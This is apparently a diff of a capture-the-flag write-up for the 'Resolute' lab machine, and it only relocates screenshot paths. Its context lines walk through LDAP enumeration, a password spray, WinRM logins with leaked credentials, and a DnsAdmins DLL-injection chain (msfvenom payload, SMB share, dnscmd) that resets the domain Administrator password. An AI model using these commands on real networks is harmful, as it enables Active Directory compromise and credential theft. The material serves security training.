@@ -43,7 +43,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.96.155
 ```
 
-![ping](resolute_01_ping.png)
+![ping](screenshots/resolute_01_ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -63,7 +63,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.96.155 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](resolute_02_nmap_allports.png)
+![allports](screenshots/resolute_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -71,7 +71,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](resolute_03_extractports.png)
+![extractports](screenshots/resolute_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -87,7 +87,7 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted](resolute_04_nmap_targeted.png)
+![targeted](screenshots/resolute_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -117,19 +117,19 @@ Guest and anonymous SMB do not expose useful shares here. Enumerate SMB and null
 crackmapexec smb 10.129.96.155
 ```
 
-![cme smb](resolute_05_crackmapexec_smb.png)
+![cme smb](screenshots/resolute_05_crackmapexec_smb.png)
 
 ```bash
 smbclient -L //10.129.96.155 -N
 ```
 
-![smbclient list](resolute_06_smbclient_null.png)
+![smbclient list](screenshots/resolute_06_smbclient_null.png)
 
 ```bash
 smbmap -u 'guest' -p '' -H 10.129.96.155
 ```
 
-![smbmap](resolute_07_smbmap_guest.png)
+![smbmap](screenshots/resolute_07_smbmap_guest.png)
 
 ---
 ### 2.2 LDAP Enumeration
@@ -140,7 +140,7 @@ Anonymous **LDAP** bind allows querying users and attributes. Dump the domain an
 ldapsearch -x -H ldap://10.129.96.155 -b "dc=megabank,dc=local" -s sub "*"
 ```
 
-![ldap dump](resolute_08_ldapsearch_dump.png)
+![ldap dump](screenshots/resolute_08_ldapsearch_dump.png)
 
 Filter for password-related context:
 
@@ -149,7 +149,7 @@ ldapsearch -x -H ldap://10.129.96.155 -b "dc=megabank,dc=local" \
   "(&(objectCategory=person)(objectClass=user))" sAMAccountName description | grep -i password
 ```
 
-![ldap password grep](resolute_09_ldapsearch_password_grep.png)
+![ldap password grep](screenshots/resolute_09_ldapsearch_password_grep.png)
 
 Build a username list for spraying:
 
@@ -159,7 +159,7 @@ ldapsearch -x -H ldap://10.129.96.155 -b "dc=megabank,dc=local" \
   grep "^sAMAccountName:" | awk '{print $2}' > users.txt
 ```
 
-![ldapsearch users](resolute_10_ldapsearch_users.png)
+![ldapsearch users](screenshots/resolute_10_ldapsearch_users.png)
 
 ### 2.3 Account lockout policy
 
@@ -169,7 +169,7 @@ Before spraying, verify lockout settings:
 ldapsearch -x -H ldap://10.129.96.155 -b "dc=megabank,dc=local" -s sub "*" | grep -i lockout
 ```
 
-![ldap lockout](resolute_11_ldapsearch_lockout.png)
+![ldap lockout](screenshots/resolute_11_ldapsearch_lockout.png)
 
 `lockoutThreshold: 0` indicates no account lockout in this lab, making a controlled spray safer.
 
@@ -184,7 +184,7 @@ Spray the candidate default password derived from LDAP context against **`users.
 crackmapexec smb 10.129.96.155 -u users.txt -p 'Welcome123!' --continue-on-success
 ```
 
-![password spray](resolute_12_password_spray_melanie.png)
+![password spray](screenshots/resolute_12_password_spray_melanie.png)
 
 ### 3.2 WinRM as `melanie`
 
@@ -195,7 +195,7 @@ crackmapexec winrm 10.129.96.155 -u melanie -p 'Welcome123!'
 evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
 ```
 
-![cme winrm melanie](resolute_13_winrm_melanie.png)
+![cme winrm melanie](screenshots/resolute_13_winrm_melanie.png)
 
 ---
 ### 3.3 User flag
@@ -208,7 +208,7 @@ cd ..\Desktop
 type user.txt
 ```
 
-![user.txt](resolute_14_user_flag.png)
+![user.txt](screenshots/resolute_14_user_flag.png)
 
 ðŸ **User flag obtained**
 
@@ -223,14 +223,14 @@ cd C:\PSTranscripts\20191203
 Get-ChildItem -Force
 ```
 
-![PSTranscripts folder](resolute_15_pstranscripts_folder.png)
+![PSTranscripts folder](screenshots/resolute_15_pstranscripts_folder.png)
 
 ```powershell
 type .\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
 ```
 
-![PSTranscript excerpt 1](resolute_16_pstranscript_txt_1.png)
-![PSTranscript excerpt 2](resolute_17_pstranscript_txt_2.png)
+![PSTranscript excerpt 1](screenshots/resolute_16_pstranscript_txt_1.png)
+![PSTranscript excerpt 2](screenshots/resolute_17_pstranscript_txt_2.png)
 
 The transcript leaks credentials for **`ryan`** (commonly via a mistyped **`net use`** command captured in the log).
 
@@ -242,17 +242,17 @@ Validate the transcript-derived password over WinRM and open a shell as **`ryan`
 crackmapexec winrm 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
 ```
 
-![cme winrm ryan](resolute_18_crackmapexec_winrm_ryan.png)
+![cme winrm ryan](screenshots/resolute_18_crackmapexec_winrm_ryan.png)
 
 ```bash
 evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
 ```
 
-![evil-winrm ryan](resolute_19_evilwinrm_ryan.png)
+![evil-winrm ryan](screenshots/resolute_19_evilwinrm_ryan.png)
 
 `C:\Users\ryan\Desktop\note.txt` states that only **Administrator** account changes persist under an automated revert policyâ€”pointing toward a **Domain Admin** takeover.
 
-![note.txt](resolute_20_ryan_desktop_note_txt.png)
+![note.txt](screenshots/resolute_20_ryan_desktop_note_txt.png)
 
 ---
 ## 4. Privilege Escalation
@@ -266,7 +266,7 @@ whoami /groups
 net user ryan
 ```
 
-![DnsAdmins groups](resolute_21_evilwinrm_ryan_groups_dnsadmins.png)
+![DnsAdmins groups](screenshots/resolute_21_evilwinrm_ryan_groups_dnsadmins.png)
 
 **`MEGABANK\DnsAdmins`** can configure the DNS service to load a **server-level plugin DLL**. Typical chain:
 
@@ -278,7 +278,7 @@ msfvenom -p windows/x64/exec cmd='net user Administrator admin123@ /domain' -f d
 impacket-smbserver share . -smb2support
 ```
 
-![msfvenom smbserver](resolute_22_msfvenom_smbserver.png)
+![msfvenom smbserver](screenshots/resolute_22_msfvenom_smbserver.png)
 
 3. On the DC as **`ryan`**, register the DLL path and restart **DNS**:
 
@@ -288,7 +288,7 @@ sc stop dns
 sc start dns
 ```
 
-![dnscmd sc dns](resolute_23_dnscmd_sc_dns.png)
+![dnscmd sc dns](screenshots/resolute_23_dnscmd_sc_dns.png)
 
 4. Authenticate as **Administrator** with the new password over **WinRM**.
 
@@ -296,7 +296,7 @@ sc start dns
 crackmapexec winrm 10.129.96.155 -u Administrator -p 'admin123@'
 ```
 
-![cme winrm admin](resolute_24_crackmapexec_winrm_admin.png)
+![cme winrm admin](screenshots/resolute_24_crackmapexec_winrm_admin.png)
 
 ```powershell
 evil-winrm -i 10.129.96.155 -u Administrator -p 'admin123@'
@@ -305,7 +305,7 @@ cd ..\Desktop
 type root.txt
 ```
 
-![root](resolute_25_root_flag.png)
+![root](screenshots/resolute_25_root_flag.png)
 
 ðŸ **Root flag obtained**
 
